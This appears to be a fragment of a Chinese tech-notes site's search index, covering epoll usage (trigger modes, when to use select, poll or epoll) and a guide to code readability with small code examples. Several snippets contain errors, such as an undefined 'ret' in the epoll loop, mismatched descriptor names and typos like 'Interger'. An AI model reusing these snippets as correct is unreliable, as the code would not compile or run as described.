ev.events = EPOLLIN | EPOLLONESHOT;
// Add the descriptor into the monitoring list. We can do it even if another thread is
// waiting in epoll_wait - the descriptor will be properly added
if ( epoll_ctl( epollfd, EPOLL_CTL_ADD, pConnection1->getSocket(), &ev ) != 0 ) // report error // Wait for up to 20 events (assuming we have added maybe 200 sockets before that it may happen)
struct epoll_event pevents[ 20 ]; // Wait for 10 seconds, and retrieve less than 20 epoll_event and store them into epoll_event array
int ready = epoll_wait( pollingfd, pevents, 20, 10000 );
// Check if epoll actually succeed
if ( ret == -1 ) // report error and abort
else if ( ret == 0 ) // timeout; no event detected
else
{ // Check if any events detected for ( int i = 0; i < ready; i++ ) { if ( pevents[i].events & EPOLLIN ) { // Get back our connection pointer Connection * c = (Connection*) pevents[i].data.ptr; c->handleReadEvent(); } }
}`},{header:"\u5DE5\u4F5C\u6A21\u5F0F",slug:"\u5DE5\u4F5C\u6A21\u5F0F",content:"epoll \u7684\u63CF\u8FF0\u7B26\u4E8B\u4EF6\u6709\u4E24\u79CD\u89E6\u53D1\u6A21\u5F0F\uFF1ALT\uFF08level trigger\uFF09\u548C ET\uFF08edge trigger\uFF09\u3002"},{header:"1. LT \u6A21\u5F0F",slug:"_1-lt-\u6A21\u5F0F",content:"\u5F53 epoll_wait() \u68C0\u6D4B\u5230\u63CF\u8FF0\u7B26\u4E8B\u4EF6\u5230\u8FBE\u65F6\uFF0C\u5C06\u6B64\u4E8B\u4EF6\u901A\u77E5\u8FDB\u7A0B\uFF0C\u8FDB\u7A0B\u53EF\u4EE5\u4E0D\u7ACB\u5373\u5904\u7406\u8BE5\u4E8B\u4EF6\uFF0C\u4E0B\u6B21\u8C03\u7528 epoll_wait() \u4F1A\u518D\u6B21\u901A\u77E5\u8FDB\u7A0B\u3002\u662F\u9ED8\u8BA4\u7684\u4E00\u79CD\u6A21\u5F0F\uFF0C\u5E76\u4E14\u540C\u65F6\u652F\u6301 Blocking \u548C No-Blocking\u3002"},{header:"2. ET \u6A21\u5F0F",slug:"_2-et-\u6A21\u5F0F",content:`\u548C LT \u6A21\u5F0F\u4E0D\u540C\u7684\u662F\uFF0C\u901A\u77E5\u4E4B\u540E\u8FDB\u7A0B\u5FC5\u987B\u7ACB\u5373\u5904\u7406\u4E8B\u4EF6\uFF0C\u4E0B\u6B21\u518D\u8C03\u7528 epoll_wait() \u65F6\u4E0D\u4F1A\u518D\u5F97\u5230\u4E8B\u4EF6\u5230\u8FBE\u7684\u901A\u77E5\u3002
\u5F88\u5927\u7A0B\u5EA6\u4E0A\u51CF\u5C11\u4E86 epoll \u4E8B\u4EF6\u88AB\u91CD\u590D\u89E6\u53D1\u7684\u6B21\u6570\uFF0C\u56E0\u6B64\u6548\u7387\u8981\u6BD4 LT \u6A21\u5F0F\u9AD8\u3002\u53EA\u652F\u6301 No-Blocking\uFF0C\u4EE5\u907F\u514D\u7531\u4E8E\u4E00\u4E2A\u6587\u4EF6\u53E5\u67C4\u7684\u963B\u585E\u8BFB/\u963B\u585E\u5199\u64CD\u4F5C\u628A\u5904\u7406\u591A\u4E2A\u6587\u4EF6\u63CF\u8FF0\u7B26\u7684\u4EFB\u52A1\u997F\u6B7B\u3002`},{header:"\u5E94\u7528\u573A\u666F",slug:"\u5E94\u7528\u573A\u666F",content:"\u5F88\u5BB9\u6613\u4EA7\u751F\u4E00\u79CD\u9519\u89C9\u8BA4\u4E3A\u53EA\u8981\u7528 epoll \u5C31\u53EF\u4EE5\u4E86\uFF0Cselect \u548C poll \u90FD\u5DF2\u7ECF\u8FC7\u65F6\u4E86\uFF0C\u5176\u5B9E\u5B83\u4EEC\u90FD\u6709\u5404\u81EA\u7684\u4F7F\u7528\u573A\u666F\u3002"},{header:"1. select \u5E94\u7528\u573A\u666F",slug:"_1-select-\u5E94\u7528\u573A\u666F",content:`select \u7684 timeout \u53C2\u6570\u7CBE\u5EA6\u4E3A\u5FAE\u79D2\uFF0C\u800C poll \u548C epoll \u4E3A\u6BEB\u79D2\uFF0C\u56E0\u6B64 select \u66F4\u52A0\u9002\u7528\u4E8E\u5B9E\u65F6\u6027\u8981\u6C42\u6BD4\u8F83\u9AD8\u7684\u573A\u666F\uFF0C\u6BD4\u5982\u6838\u53CD\u5E94\u5806\u7684\u63A7\u5236\u3002
select \u53EF\u79FB\u690D\u6027\u66F4\u597D\uFF0C\u51E0\u4E4E\u88AB\u6240\u6709\u4E3B\u6D41\u5E73\u53F0\u6240\u652F\u6301\u3002`},{header:"2. poll \u5E94\u7528\u573A\u666F",slug:"_2-poll-\u5E94\u7528\u573A\u666F",content:"poll \u6CA1\u6709\u6700\u5927\u63CF\u8FF0\u7B26\u6570\u91CF\u7684\u9650\u5236\uFF0C\u5982\u679C\u5E73\u53F0\u652F\u6301\u5E76\u4E14\u5BF9\u5B9E\u65F6\u6027\u8981\u6C42\u4E0D\u9AD8\uFF0C\u5E94\u8BE5\u4F7F\u7528 poll \u800C\u4E0D\u662F select\u3002"},{header:"3. epoll \u5E94\u7528\u573A\u666F",slug:"_3-epoll-\u5E94\u7528\u573A\u666F",content:`\u53EA\u9700\u8981\u8FD0\u884C\u5728 Linux \u5E73\u53F0\u4E0A\uFF0C\u6709\u5927\u91CF\u7684\u63CF\u8FF0\u7B26\u9700\u8981\u540C\u65F6\u8F6E\u8BE2\uFF0C\u5E76\u4E14\u8FD9\u4E9B\u8FDE\u63A5\u6700\u597D\u662F\u957F\u8FDE\u63A5\u3002
\u9700\u8981\u540C\u65F6\u76D1\u63A7\u5C0F\u4E8E 1000 \u4E2A\u63CF\u8FF0\u7B26\uFF0C\u5C31\u6CA1\u6709\u5FC5\u8981\u4F7F\u7528 epoll\uFF0C\u56E0\u4E3A\u8FD9\u4E2A\u5E94\u7528\u573A\u666F\u4E0B\u5E76\u4E0D\u80FD\u4F53\u73B0 epoll \u7684\u4F18\u52BF\u3002
\u9700\u8981\u76D1\u63A7\u7684\u63CF\u8FF0\u7B26\u72B6\u6001\u53D8\u5316\u591A\uFF0C\u800C\u4E14\u90FD\u662F\u975E\u5E38\u77ED\u6682\u7684\uFF0C\u4E5F\u6CA1\u6709\u5FC5\u8981\u4F7F\u7528 epoll\u3002\u56E0\u4E3A epoll \u4E2D\u7684\u6240\u6709\u63CF\u8FF0\u7B26\u90FD\u5B58\u50A8\u5728\u5185\u6838\u4E2D\uFF0C\u9020\u6210\u6BCF\u6B21\u9700\u8981\u5BF9\u63CF\u8FF0\u7B26\u7684\u72B6\u6001\u6539\u53D8\u90FD\u9700\u8981\u901A\u8FC7 epoll_ctl() \u8FDB\u884C\u7CFB\u7EDF\u8C03\u7528\uFF0C\u9891\u7E41\u7CFB\u7EDF\u8C03\u7528\u964D\u4F4E\u6548\u7387\u3002\u5E76\u4E14 epoll \u7684\u63CF\u8FF0\u7B26\u5B58\u50A8\u5728\u5185\u6838\uFF0C\u4E0D\u5BB9\u6613\u8C03\u8BD5\u3002`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:`Stevens W R, Fenner B, Rudoff A M. UNIX network programming[M]. Addison-Wesley Professional, 2004.
http://man7.org/linux/man-pages/man2/select.2.html
http://man7.org/linux/man-pages/man2/poll.2.html
Boost application performance using asynchronous I/O
Synchronous and Asynchronous I/O
Linux IO \u6A21\u5F0F\u53CA select\u3001poll\u3001epoll \u8BE6\u89E3
poll vs select vs event-based
select / poll / epoll: practical difference for system architects
Browse the source code of userspace/glibc/sysdeps/unix/sysv/linux/ online`}]},{path:"/java/%E4%BB%A3%E7%A0%81%E5%8F%AF%E8%AF%BB%E6%80%A7.html",title:"\u4E00\u3001\u53EF\u8BFB\u6027\u7684\u91CD\u8981\u6027",pathLocale:"/",contents:[{header:"",slug:"",content:`\u4E00\u3001\u53EF\u8BFB\u6027\u7684\u91CD\u8981\u6027
\u4E8C\u3001\u7528\u540D\u5B57\u8868\u8FBE\u4EE3\u7801\u542B\u4E49
\u4E09\u3001\u540D\u5B57\u4E0D\u80FD\u5E26\u6765\u6B67\u4E49
\u56DB\u3001\u826F\u597D\u7684\u4EE3\u7801\u98CE\u683C
\u4E94\u3001\u4E3A\u4F55\u7F16\u5199\u6CE8\u91CA
\u516D\u3001\u5982\u4F55\u7F16\u5199\u6CE8\u91CA
\u4E03\u3001\u63D0\u9AD8\u63A7\u5236\u6D41\u7684\u53EF\u8BFB\u6027
\u516B\u3001\u62C6\u5206\u957F\u8868\u8FBE\u5F0F
\u4E5D\u3001\u53D8\u91CF\u4E0E\u53EF\u8BFB\u6027
\u5341\u3001\u62BD\u53D6\u51FD\u6570
\u5341\u4E00\u3001\u4E00\u6B21\u53EA\u505A\u4E00\u4EF6\u4E8B
\u5341\u4E8C\u3001\u7528\u81EA\u7136\u8BED\u8A00\u8868\u8FF0\u4EE3\u7801
\u5341\u4E09\u3001\u51CF\u5C11\u4EE3\u7801\u91CF
\u53C2\u8003\u8D44\u6599`},{header:"\u4E00\u3001\u53EF\u8BFB\u6027\u7684\u91CD\u8981\u6027",slug:"\u4E00\u3001\u53EF\u8BFB\u6027\u7684\u91CD\u8981\u6027",content:`\u7F16\u7A0B\u6709\u5F88\u5927\u4E00\u90E8\u5206\u65F6\u95F4\u662F\u5728\u9605\u8BFB\u4EE3\u7801\uFF0C\u4E0D\u4EC5\u8981\u9605\u8BFB\u81EA\u5DF1\u7684\u4EE3\u7801\uFF0C\u800C\u4E14\u8981\u9605\u8BFB\u522B\u4EBA\u7684\u4EE3\u7801\u3002\u56E0\u6B64\uFF0C\u53EF\u8BFB\u6027\u826F\u597D\u7684\u4EE3\u7801\u80FD\u591F\u5927\u5927\u63D0\u9AD8\u7F16\u7A0B\u6548\u7387\u3002
\u53EF\u8BFB\u6027\u826F\u597D\u7684\u4EE3\u7801\u5F80\u5F80\u4F1A\u8BA9\u4EE3\u7801\u67B6\u6784\u66F4\u597D\uFF0C\u56E0\u4E3A\u7A0B\u5E8F\u5458\u66F4\u613F\u610F\u53BB\u4FEE\u6539\u8FD9\u90E8\u5206\u4EE3\u7801\uFF0C\u800C\u4E14\u4E5F\u66F4\u5BB9\u6613\u4FEE\u6539\u3002
\u53EA\u6709\u5728\u6838\u5FC3\u9886\u57DF\u4E3A\u4E86\u6548\u7387\u624D\u53EF\u4EE5\u653E\u5F03\u53EF\u8BFB\u6027\uFF0C\u5426\u5219\u53EF\u8BFB\u6027\u662F\u7B2C\u4E00\u4F4D\u3002`},{header:"\u4E8C\u3001\u7528\u540D\u5B57\u8868\u8FBE\u4EE3\u7801\u542B\u4E49",slug:"\u4E8C\u3001\u7528\u540D\u5B57\u8868\u8FBE\u4EE3\u7801\u542B\u4E49",content:`\u4E00\u4E9B\u6BD4\u8F83\u6709\u8868\u8FBE\u529B\u7684\u5355\u8BCD\uFF1A \u5355\u8BCD
\u53EF\u66FF\u4EE3\u5355\u8BCD send
deliver\u3001dispatch\u3001announce\u3001distribute\u3001route find
search\u3001extract\u3001locate\u3001recover start
launch\u3001create\u3001begin\u3001open make
create\u3001set up\u3001build\u3001generate\u3001compose\u3001add\u3001new \u4F7F\u7528 i\u3001j\u3001k \u4F5C\u4E3A\u5FAA\u73AF\u8FED\u4EE3\u5668\u7684\u540D\u5B57\u8FC7\u4E8E\u7B80\u5355\uFF0Cuser_i\u3001member_i \u8FD9\u79CD\u540D\u5B57\u4F1A\u66F4\u6709\u8868\u8FBE\u529B\u3002\u56E0\u4E3A\u5FAA\u73AF\u5C42\u6B21\u8D8A\u591A\uFF0C\u4EE3\u7801\u8D8A\u96BE\u7406\u89E3\uFF0C\u6709\u8868\u8FBE\u529B\u7684\u8FED\u4EE3\u5668\u540D\u5B57\u53EF\u8BFB\u6027\u4F1A\u66F4\u9AD8\u3002
\u4E3A\u540D\u5B57\u6DFB\u52A0\u5F62\u5BB9\u8BCD\u7B49\u4FE1\u606F\u80FD\u8BA9\u540D\u5B57\u66F4\u5177\u6709\u8868\u8FBE\u529B\uFF0C\u4F46\u662F\u540D\u5B57\u4E5F\u4F1A\u53D8\u957F\u3002\u540D\u5B57\u957F\u77ED\u7684\u51C6\u5219\u662F\uFF1A\u4F5C\u7528\u57DF\u8D8A\u5927\uFF0C\u540D\u5B57\u8D8A\u957F\u3002\u56E0\u6B64\u53EA\u6709\u5728\u77ED\u4F5C\u7528\u57DF\u624D\u80FD\u4F7F\u7528\u4E00\u4E9B\u7B80\u5355\u540D\u5B57\u3002`},{header:"\u4E09\u3001\u540D\u5B57\u4E0D\u80FD\u5E26\u6765\u6B67\u4E49",slug:"\u4E09\u3001\u540D\u5B57\u4E0D\u80FD\u5E26\u6765\u6B67\u4E49",content:`\u8D77\u5B8C\u540D\u5B57\u8981\u601D\u8003\u4E00\u4E0B\u522B\u4EBA\u4F1A\u5BF9\u8FD9\u4E2A\u540D\u5B57\u6709\u4F55\u89E3\u8BFB\uFF0C\u4F1A\u4E0D\u4F1A\u8BEF\u89E3\u4E86\u539F\u672C\u60F3\u8868\u8FBE\u7684\u542B\u4E49\u3002
\u5E03\u5C14\u76F8\u5173\u7684\u547D\u540D\u52A0\u4E0A is\u3001can\u3001should\u3001has \u7B49\u524D\u7F00\u3002 \u7528 min\u3001max \u8868\u793A\u6570\u91CF\u8303\u56F4\uFF1B \u7528 first\u3001last \u8868\u793A\u8BBF\u95EE\u7A7A\u95F4\u7684\u5305\u542B\u8303\u56F4\uFF1B begin\u3001end \u8868\u793A\u8BBF\u95EE\u7A7A\u95F4\u7684\u6392\u9664\u8303\u56F4\uFF0C\u5373 end \u4E0D\u5305\u542B\u5C3E\u90E8\u3002`},{header:"\u56DB\u3001\u826F\u597D\u7684\u4EE3\u7801\u98CE\u683C",slug:"\u56DB\u3001\u826F\u597D\u7684\u4EE3\u7801\u98CE\u683C",content:`\u9002\u5F53\u7684\u7A7A\u884C\u548C\u7F29\u8FDB\u3002
\u6392\u5217\u6574\u9F50\u7684\u6CE8\u91CA\uFF1A
int a = 1; // \u6CE8\u91CA
int b = 11; // \u6CE8\u91CA
int c = 111; // \u6CE8\u91CA
\u8BED\u53E5\u987A\u5E8F\u4E0D\u80FD\u968F\u610F\uFF0C\u6BD4\u5982\u4E0E html \u8868\u5355\u76F8\u5173\u8054\u7684\u53D8\u91CF\u7684\u8D4B\u503C\u5E94\u8BE5\u548C\u8868\u5355\u5728 html \u4E2D\u7684\u987A\u5E8F\u4E00\u81F4\u3002`},{header:"\u4E94\u3001\u4E3A\u4F55\u7F16\u5199\u6CE8\u91CA",slug:"\u4E94\u3001\u4E3A\u4F55\u7F16\u5199\u6CE8\u91CA",content:`\u9605\u8BFB\u4EE3\u7801\u9996\u5148\u4F1A\u6CE8\u610F\u5230\u6CE8\u91CA\uFF0C\u5982\u679C\u6CE8\u91CA\u6CA1\u592A\u5927\u4F5C\u7528\uFF0C\u90A3\u4E48\u5C31\u4F1A\u6D6A\u8D39\u4EE3\u7801\u9605\u8BFB\u7684\u65F6\u95F4\u3002\u90A3\u4E9B\u80FD\u76F4\u63A5\u770B\u51FA\u542B\u4E49\u7684\u4EE3\u7801\u4E0D\u9700\u8981\u5199\u6CE8\u91CA\uFF0C\u7279\u522B\u662F\u4E0D\u9700\u8981\u4E3A\u6BCF\u4E2A\u65B9\u6CD5\u90FD\u52A0\u4E0A\u6CE8\u91CA\uFF0C\u6BD4\u5982\u90A3\u4E9B\u7B80\u5355\u7684 getter \u548C setter \u65B9\u6CD5\uFF0C\u4E3A\u8FD9\u4E9B\u65B9\u6CD5\u5199\u6CE8\u91CA\u53CD\u800C\u8BA9\u4EE3\u7801\u53EF\u8BFB\u6027\u66F4\u5DEE\u3002
\u4E0D\u80FD\u56E0\u4E3A\u6709\u6CE8\u91CA\u5C31\u968F\u4FBF\u8D77\u4E2A\u540D\u5B57\uFF0C\u800C\u662F\u4E89\u53D6\u8D77\u4E2A\u597D\u540D\u5B57\u800C\u4E0D\u5199\u6CE8\u91CA\u3002
\u53EF\u4EE5\u7528\u6CE8\u91CA\u6765\u8BB0\u5F55\u91C7\u7528\u5F53\u524D\u89E3\u51B3\u529E\u6CD5\u7684\u601D\u8003\u8FC7\u7A0B\uFF0C\u4ECE\u800C\u8BA9\u8BFB\u8005\u66F4\u5BB9\u6613\u7406\u89E3\u4EE3\u7801\u3002
\u6CE8\u91CA\u7528\u6765\u63D0\u9192\u4E00\u4E9B\u7279\u6B8A\u60C5\u51B5\u3002
\u7528 TODO \u7B49\u505A\u6807\u8BB0\uFF1A \u6807\u8BB0
\u7528\u6CD5 TODO
\u5F85\u505A FIXME
\u5F85\u4FEE\u590D HACK
\u7C97\u7CD9\u7684\u89E3\u51B3\u65B9\u6848 XXX
\u5371\u9669\uFF01\u8FD9\u91CC\u6709\u91CD\u8981\u7684\u95EE\u9898`},{header:"\u516D\u3001\u5982\u4F55\u7F16\u5199\u6CE8\u91CA",slug:"\u516D\u3001\u5982\u4F55\u7F16\u5199\u6CE8\u91CA",content:`\u5C3D\u91CF\u7B80\u6D01\u660E\u4E86\uFF1A
// The first String is student's name
// The Second Integer is student's score
Map<String, Integer> scoreMap = new HashMap<>();
// Student's name -> Student's score
Map<String, Integer> scoreMap = new HashMap<>();
\u6DFB\u52A0\u6D4B\u8BD5\u7528\u4F8B\u6765\u8BF4\u660E\uFF1A
// ...
// Example: add(1, 2), return 3
int add(int x, int y) { return x + y;
}
\u4F7F\u7528\u4E13\u4E1A\u540D\u8BCD\u6765\u7F29\u77ED\u6982\u5FF5\u4E0A\u7684\u89E3\u91CA\uFF0C\u6BD4\u5982\u7528\u8BBE\u8BA1\u6A21\u5F0F\u540D\u6765\u8BF4\u660E\u4EE3\u7801\u3002`},{header:"\u4E03\u3001\u63D0\u9AD8\u63A7\u5236\u6D41\u7684\u53EF\u8BFB\u6027",slug:"\u4E03\u3001\u63D0\u9AD8\u63A7\u5236\u6D41\u7684\u53EF\u8BFB\u6027",content:`\u6761\u4EF6\u8868\u8FBE\u5F0F\u4E2D\uFF0C\u5DE6\u4FA7\u662F\u53D8\u91CF\uFF0C\u53F3\u4FA7\u662F\u5E38\u6570\u3002\u6BD4\u5982\u4E0B\u9762\u7B2C\u4E00\u4E2A\u8BED\u53E5\u6B63\u786E\uFF1A
if (len < 10)
if (10 > len)
\u53EA\u6709\u5728\u903B\u8F91\u7B80\u5355\u7684\u60C5\u51B5\u4E0B\u4F7F\u7528 ? : \u4E09\u76EE\u8FD0\u7B97\u7B26\u6765\u4F7F\u4EE3\u7801\u66F4\u7D27\u51D1\uFF0C\u5426\u5219\u5E94\u8BE5\u62C6\u5206\u6210 if / else\uFF1B
do / while \u7684\u6761\u4EF6\u653E\u5728\u540E\u9762\uFF0C\u4E0D\u591F\u7B80\u5355\u660E\u4E86\uFF0C\u5E76\u4E14\u4F1A\u6709\u4E00\u4E9B\u8FF7\u60D1\u7684\u5730\u65B9\uFF0C\u6700\u597D\u4F7F\u7528 while \u6765\u4EE3\u66FF\u3002
\u5982\u679C\u53EA\u6709\u4E00\u4E2A goto \u76EE\u6807\uFF0C\u90A3\u4E48 goto \u5C1A\u4E14\u8FD8\u80FD\u63A5\u53D7\uFF0C\u4F46\u662F\u8FC7\u4E8E\u590D\u6742\u7684 goto \u4F1A\u8BA9\u4EE3\u7801\u53EF\u8BFB\u6027\u7279\u522B\u5DEE\uFF0C\u5E94\u8BE5\u907F\u514D\u4F7F\u7528 goto\u3002
\u5728\u5D4C\u5957\u7684\u5FAA\u73AF\u4E2D\uFF0C\u7528\u4E00\u4E9B return \u8BED\u53E5\u5F80\u5F80\u80FD\u51CF\u5C11\u5D4C\u5957\u7684\u5C42\u6570\u3002`},{header:"\u516B\u3001\u62C6\u5206\u957F\u8868\u8FBE\u5F0F",slug:"\u516B\u3001\u62C6\u5206\u957F\u8868\u8FBE\u5F0F",content:`\u957F\u8868\u8FBE\u5F0F\u7684\u53EF\u8BFB\u6027\u5F88\u5DEE\uFF0C\u53EF\u4EE5\u5F15\u5165\u4E00\u4E9B\u89E3\u91CA\u53D8\u91CF\u4ECE\u800C\u62C6\u5206\u8868\u8FBE\u5F0F\uFF1A
if line.split(':')[0].strip() == "root": ...
username = line.split(':')[0].strip()
if username == "root": ...
\u4F7F\u7528\u6469\u6839\u5B9A\u7406\u7B80\u5316\u4E00\u4E9B\u903B\u8F91\u8868\u8FBE\u5F0F\uFF1A
if (!a && !b) { ...
}
if (!(a || b)) { ...
}`},{header:"\u4E5D\u3001\u53D8\u91CF\u4E0E\u53EF\u8BFB\u6027",slug:"\u4E5D\u3001\u53D8\u91CF\u4E0E\u53EF\u8BFB\u6027",content:`\u53BB\u9664\u63A7\u5236\u6D41\u53D8\u91CF \u3002\u5728\u5FAA\u73AF\u4E2D\u901A\u8FC7\u4F7F\u7528 break \u6216\u8005 return \u53EF\u4EE5\u51CF\u5C11\u63A7\u5236\u6D41\u53D8\u91CF\u7684\u4F7F\u7528\u3002
boolean done = false;
while (/* condition */ && !done) { ... if ( ... ) { done = true; continue; }
}
while(/* condition */) { ... if ( ... ) { break; }
}
\u51CF\u5C0F\u53D8\u91CF\u4F5C\u7528\u57DF \u3002\u4F5C\u7528\u57DF\u8D8A\u5C0F\uFF0C\u8D8A\u5BB9\u6613\u5B9A\u4F4D\u5230\u53D8\u91CF\u6240\u6709\u4F7F\u7528\u7684\u5730\u65B9\u3002
JavaScript \u53EF\u4EE5\u7528\u95ED\u5305\u51CF\u5C0F\u4F5C\u7528\u57DF\u3002\u4EE5\u4E0B\u4EE3\u7801\u4E2D submit_form \u662F\u51FD\u6570\u53D8\u91CF\uFF0Csubmitted \u53D8\u91CF\u63A7\u5236\u51FD\u6570\u4E0D\u4F1A\u88AB\u63D0\u4EA4\u4E24\u6B21\u3002\u7B2C\u4E00\u4E2A\u5B9E\u73B0\u4E2D submitted \u662F\u5168\u5C40\u53D8\u91CF\uFF0C\u7B2C\u4E8C\u4E2A\u5B9E\u73B0\u628A submitted \u653E\u5230\u533F\u540D\u51FD\u6570\u4E2D\uFF0C\u4ECE\u800C\u9650\u5236\u4E86\u8D77\u4F5C\u7528\u57DF\u8303\u56F4\u3002
submitted = false;
var submit_form = function(form_name) { if (submitted) { return; } submitted = true;
};
var submit_form = (function() { var submitted = false; return function(form_name) { if(submitted) { return; } submitted = true; }
}()); // () \u4F7F\u5F97\u5916\u5C42\u533F\u540D\u51FD\u6570\u7ACB\u5373\u6267\u884C
JavaScript \u4E2D\u6CA1\u6709\u7528 var \u58F0\u660E\u7684\u53D8\u91CF\u90FD\u662F\u5168\u5C40\u53D8\u91CF\uFF0C\u800C\u5168\u5C40\u53D8\u91CF\u5F88\u5BB9\u6613\u9020\u6210\u8FF7\u60D1\uFF0C\u56E0\u6B64\u5E94\u5F53\u603B\u662F\u7528 var \u6765\u58F0\u660E\u53D8\u91CF\u3002
\u53D8\u91CF\u5B9A\u4E49\u7684\u4F4D\u7F6E\u5E94\u5F53\u79BB\u5B83\u4F7F\u7528\u7684\u4F4D\u7F6E\u6700\u8FD1\u3002
\u5B9E\u4F8B\u89E3\u6790
\u5728\u4E00\u4E2A\u7F51\u9875\u4E2D\u6709\u4EE5\u4E0B\u6587\u672C\u8F93\u5165\u5B57\u6BB5\uFF1A
<input type = "text" id = "input1" value = "a">
<input type = "text" id = "input2" value = "b">
<input type = "text" id = "input3" value = "">
<input type = "text" id = "input4" value = "d">
\u73B0\u5728\u8981\u63A5\u53D7\u4E00\u4E2A\u5B57\u7B26\u4E32\u5E76\u628A\u5B83\u653E\u5230\u7B2C\u4E00\u4E2A\u7A7A\u7684 input \u5B57\u6BB5\u4E2D\uFF0C\u521D\u59CB\u5B9E\u73B0\u5982\u4E0B\uFF1A
var setFirstEmptyInput = function(new_alue) { var found = false; var i = 1; var elem = document.getElementById('input' + i); while (elem != null) { if (elem.value === '') { found = true; break; } i++; elem = document.getElementById('input' + i); } if (found) elem.value = new_value; return elem;
}
\u4EE5\u4E0A\u5B9E\u73B0\u6709\u4EE5\u4E0B\u95EE\u9898\uFF1A found \u53EF\u4EE5\u53BB\u9664\uFF1B
elem \u4F5C\u7528\u57DF\u8FC7\u5927\uFF1B
\u53EF\u4EE5\u7528 for \u5FAA\u73AF\u4EE3\u66FF while \u5FAA\u73AF\uFF1B var setFirstEmptyInput = function(new_value) { for (var i = 1; true; i++) { var elem = document.getElementById('input' + i); if (elem === null) { return null; } if (elem.value === '') { elem.value = new_value; return elem; } }
};`},{header:"\u5341\u3001\u62BD\u53D6\u51FD\u6570",slug:"\u5341\u3001\u62BD\u53D6\u51FD\u6570",content:`\u5DE5\u7A0B\u5B66\u5C31\u662F\u628A\u5927\u95EE\u9898\u62C6\u5206\u6210\u5C0F\u95EE\u9898\u518D\u628A\u8FD9\u4E9B\u95EE\u9898\u7684\u89E3\u51B3\u65B9\u6848\u653E\u56DE\u4E00\u8D77\u3002
\u9996\u5148\u5E94\u8BE5\u660E\u786E\u4E00\u4E2A\u51FD\u6570\u7684\u9AD8\u5C42\u6B21\u76EE\u6807\uFF0C\u7136\u540E\u5BF9\u4E8E\u4E0D\u662F\u76F4\u63A5\u4E3A\u4E86\u8FD9\u4E2A\u76EE\u6807\u5DE5\u4F5C\u7684\u4EE3\u7801\uFF0C\u62BD\u53D6\u51FA\u6765\u653E\u5230\u72EC\u7ACB\u7684\u51FD\u6570\u4E2D\u3002
\u4ECB\u7ECD\u6027\u7684\u4EE3\u7801\uFF1A
int findClostElement(int[] arr) { int clostIdx; int clostDist = Interger.MAX_VALUE; for (int i = 0; i < arr.length; i++) { int x = ...; int y = ...; int z = ...; int value = x * y * z; int dist = Math.sqrt(Math.pow(value, 2), Math.pow(arr[i], 2)); if (dist < clostDist) { clostIdx = i; clostDist = value; } } return clostIdx;
}
\u4EE5\u4E0A\u4EE3\u7801\u4E2D\u5FAA\u73AF\u90E8\u5206\u4E3B\u8981\u8BA1\u7B97\u8DDD\u79BB\uFF0C\u8FD9\u90E8\u5206\u4E0D\u5C5E\u4E8E\u4EE3\u7801\u9AD8\u5C42\u6B21\u76EE\u6807\uFF0C\u9AD8\u5C42\u6B21\u76EE\u6807\u662F\u5BFB\u627E\u6700\u5C0F\u8DDD\u79BB\u7684\u503C\uFF0C\u56E0\u6B64\u53EF\u4EE5\u628A\u8FD9\u90E8\u5206\u4EE3\u66FF\u63D0\u53D6\u5230\u72EC\u7ACB\u7684\u51FD\u6570\u4E2D\u3002\u8FD9\u6837\u505A\u4E5F\u5E26\u6765\u4E00\u4E2A\u989D\u5916\u7684\u597D\u5904\u6709\uFF1A\u53EF\u4EE5\u5355\u72EC\u8FDB\u884C\u6D4B\u8BD5\u3001\u53EF\u4EE5\u5FEB\u901F\u627E\u5230\u7A0B\u5E8F\u9519\u8BEF\u5E76\u4FEE\u6539\u3002
public int findClostElement(int[] arr) { int clostIdx; int clostDist = Interger.MAX_VALUE; for (int i = 0; i < arr.length; i++) { int dist = computDist(arr, i); if (dist < clostDist) { clostIdx = i; clostDist = value; } } return clostIdx;
}
\u5E76\u4E0D\u662F\u51FD\u6570\u62BD\u53D6\u7684\u8D8A\u591A\u8D8A\u597D\uFF0C\u5982\u679C\u62BD\u53D6\u8FC7\u591A\uFF0C\u5728\u9605\u8BFB\u4EE3\u7801\u7684\u65F6\u5019\u53EF\u80FD\u9700\u8981\u4E0D\u65AD\u8DF3\u6765\u8DF3\u53BB\u3002\u53EA\u6709\u5728\u5F53\u524D\u51FD\u6570\u4E0D\u9700\u8981\u53BB\u4E86\u89E3\u67D0\u4E00\u5757\u4EE3\u7801\u7EC6\u8282\u800C\u80FD\u591F\u8868\u8FBE\u5176\u5185\u5BB9\u65F6\uFF0C\u628A\u8FD9\u5757\u4EE3\u7801\u62BD\u53D6\u6210\u5B50\u51FD\u6570\u624D\u662F\u597D\u7684\u3002
\u51FD\u6570\u62BD\u53D6\u4E5F\u7528\u4E8E\u51CF\u5C0F\u4EE3\u7801\u7684\u5197\u4F59\u3002`},{header:"\u5341\u4E00\u3001\u4E00\u6B21\u53EA\u505A\u4E00\u4EF6\u4E8B",slug:"\u5341\u4E00\u3001\u4E00\u6B21\u53EA\u505A\u4E00\u4EF6\u4E8B",content:`\u53EA\u505A\u4E00\u4EF6\u4E8B\u7684\u4EE3\u7801\u5F88\u5BB9\u6613\u8BA9\u4EBA\u77E5\u9053\u5176\u8981\u505A\u7684\u4E8B\uFF1B
\u57FA\u672C\u6D41\u7A0B\uFF1A\u5217\u51FA\u4EE3\u7801\u6240\u505A\u7684\u6240\u6709\u4EFB\u52A1\uFF1B\u628A\u6BCF\u4E2A\u4EFB\u52A1\u62C6\u5206\u5230\u4E0D\u540C\u7684\u51FD\u6570\uFF0C\u6216\u8005\u4E0D\u540C\u7684\u6BB5\u843D\u3002`},{header:"\u5341\u4E8C\u3001\u7528\u81EA\u7136\u8BED\u8A00\u8868\u8FF0\u4EE3\u7801",slug:"\u5341\u4E8C\u3001\u7528\u81EA\u7136\u8BED\u8A00\u8868\u8FF0\u4EE3\u7801",content:"\u5148\u7528\u81EA\u7136\u8BED\u8A00\u4E66\u5199\u4EE3\u7801\u903B\u8F91\uFF0C\u4E5F\u5C31\u662F\u4F2A\u4EE3\u7801\uFF0C\u7136\u540E\u518D\u5199\u4EE3\u7801\uFF0C\u8FD9\u6837\u4EE3\u7801\u903B\u8F91\u4F1A\u66F4\u6E05\u6670\u3002"},{header:"\u5341\u4E09\u3001\u51CF\u5C11\u4EE3\u7801\u91CF",slug:"\u5341\u4E09\u3001\u51CF\u5C11\u4EE3\u7801\u91CF",content:`\u4E0D\u8981\u8FC7\u5EA6\u8BBE\u8BA1\uFF0C\u7F16\u7801\u8FC7\u7A0B\u4F1A\u6709\u5F88\u591A\u53D8\u5316\uFF0C\u8FC7\u5EA6\u8BBE\u8BA1\u7684\u5185\u5BB